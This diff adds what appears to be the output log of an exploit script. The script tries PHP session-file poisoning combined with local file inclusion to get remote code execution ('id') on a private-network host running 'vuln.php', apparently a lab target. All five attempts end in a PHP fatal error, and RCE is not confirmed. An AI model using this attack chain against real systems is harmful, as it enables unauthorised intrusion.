@@ -1,0 +1,19 @@
+[*] Target: http://10.20.0.226:8091
+[*] Command: id
+
+[attempt 1] SID=exploitdf795d982e204748aa31 file=/tmp/sess_exploitdf795d982e204748aa31
+    plant=HTTP/1.1 200 OK
+    lfi=HTTP/1.1 200 OK body=b'<br />\n<b>Fatal error</b>:  Uncaught Error: Undefined constant &quot;page&quot; in /var/www/html/vuln.php:1\nStack trace:\n#0 {main}\n  thrown in <b>/var/www/html/'
+[attempt 2] SID=exploit5453a63bf60b4ab1bafd file=/tmp/sess_exploit5453a63bf60b4ab1bafd
+    plant=HTTP/1.1 200 OK
+    lfi=HTTP/1.1 200 OK body=b'<br />\n<b>Fatal error</b>:  Uncaught Error: Undefined constant &quot;page&quot; in /var/www/html/vuln.php:1\nStack trace:\n#0 {main}\n  thrown in <b>/var/www/html/'
+[attempt 3] SID=exploit018703582ecd4ede8834 file=/tmp/sess_exploit018703582ecd4ede8834
+    plant=HTTP/1.1 200 OK
+    lfi=HTTP/1.1 200 OK body=b'<br />\n<b>Fatal error</b>:  Uncaught Error: Undefined constant &quot;page&quot; in /var/www/html/vuln.php:1\nStack trace:\n#0 {main}\n  thrown in <b>/var/www/html/'
+[attempt 4] SID=exploit5712978c46904521b15d file=/tmp/sess_exploit5712978c46904521b15d
+    plant=HTTP/1.1 200 OK
+    lfi=HTTP/1.1 200 OK body=b'<br />\n<b>Fatal error</b>:  Uncaught Error: Undefined constant &quot;page&quot; in /var/www/html/vuln.php:1\nStack trace:\n#0 {main}\n  thrown in <b>/var/www/html/'
+[attempt 5] SID=exploitc9ad6f2002f045239877 file=/tmp/sess_exploitc9ad6f2002f045239877
+    plant=HTTP/1.1 200 OK
+    lfi=HTTP/1.1 200 OK body=b'<br />\n<b>Fatal error</b>:  Uncaught Error: Undefined constant &quot;page&quot; in /var/www/html/vuln.php:1\nStack trace:\n#0 {main}\n  thrown in <b>/var/www/html/'
+[-] RCE not confirmed — LFI path/session path or timing is wrong
